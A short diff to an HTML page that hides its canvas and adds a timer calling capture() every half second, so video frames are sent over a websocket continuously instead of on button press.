@@ -7,7 +7,7 @@
 </video>
 </div>
 <button onclick="capture()">Capture</button>  <br> </br>
-<canvas id="canvas" style="overflow:auto"></canvas>
+<canvas id="canvas" style="overflow:auto;display:none;"></canvas>
 <br></br>
 <p> Image Converted to String: </p>
 <p id="printresult"></p>
@@ -45,6 +45,8 @@
     ws.send(canvas.toDataURL());
 
  }
+
+ setInterval(function(){ capture(); }, 500);
 
 </script>
 </html>
